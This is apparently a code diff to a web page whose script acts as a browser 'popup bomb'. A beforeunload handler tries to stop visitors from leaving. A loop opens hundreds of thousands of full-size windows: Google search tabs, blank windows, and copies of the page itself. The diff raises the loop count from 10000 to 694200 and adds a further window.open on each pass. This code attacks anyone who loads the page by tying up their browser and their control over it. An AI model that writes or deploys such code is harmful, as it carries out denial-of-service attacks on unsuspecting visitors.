@@ -118,13 +118,13 @@
   <br>
   <button class="buttonblue" onclick="javascript:bluePill()">Blue</button>
   </div>
+  <br>
+  <br>
+  <br>
+  <br>
+  <br>
+  <br>
   <canvas class="canvas" width="auto" height="500" id="canv"></canvas>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
-  <br>
     <script>
     var url = window.location.pathname;
       function getRandomInt(min, max) {
@@ -146,8 +146,9 @@
             e.returnValue = '';
           });
           var fakeWindow = window.open("",);
-          for (let i=0; i<10000; i++) {
+          for (let i=0; i<694200; i++) {
             var spamWindow = window.open(randomLink, "", "width=1920, height=1080");
+			var inTabWindow = window.open("", "", "width=1920, height=1080");
             var smallWindow = window.open(url, "", "width=1920,height=1080");
             var randomNumber = getRandomInt(0,9);
             var randomLink = 'https://www.google.com/search?q=' + randomNumber
